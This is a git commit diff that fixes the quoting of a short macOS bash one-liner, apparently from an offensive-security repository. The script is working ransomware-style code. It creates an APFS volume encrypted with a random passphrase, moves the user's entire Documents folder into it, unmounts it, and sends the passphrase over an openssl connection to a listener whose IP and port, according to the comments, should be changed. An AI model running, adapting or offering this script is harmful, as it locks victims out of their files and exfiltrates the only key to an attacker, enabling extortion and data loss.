7e3be5f0b8ff1eacef4fc4d7f33e9a558db4f849
Poncho <10643126+PonchoSec@users.noreply.github.com>
2022-09-20 13:07:27 +0100

    Update macos_script.sh

--- macos_script.sh
+++ macos_script.sh
@@ -1,5 +1,5 @@
 #! /usr/bin/env bash
-sh -c p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n");disk_name=$(diskutil info / | grep "APFS Container:" | tr -s " "| cut -d" " -f4);diskutil apfs addVolume "${disk_name}" APFS XX -passphrase "${p}";mv -f ~/Documents/* /Volumes/XX;diskutil umount XX;echo $p | timeout 2 openssl s_client -quiet -connect 127.0.0.1:9001 2>/dev/null;p="";
+sh -c 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n");disk_name=$(diskutil info / | grep "APFS Container:" | tr -s " "| cut -d" " -f4);diskutil apfs addVolume "${disk_name}" APFS XX -passphrase "${p}";mv -f ~/Documents/* /Volumes/XX;diskutil umount XX;echo $p | timeout 2 openssl s_client -quiet -connect 127.0.0.1:9001 2>/dev/null;p="";'
 
 # Change the IP address and Port number
 # Use chmod +x <name>.sh to make the script executable
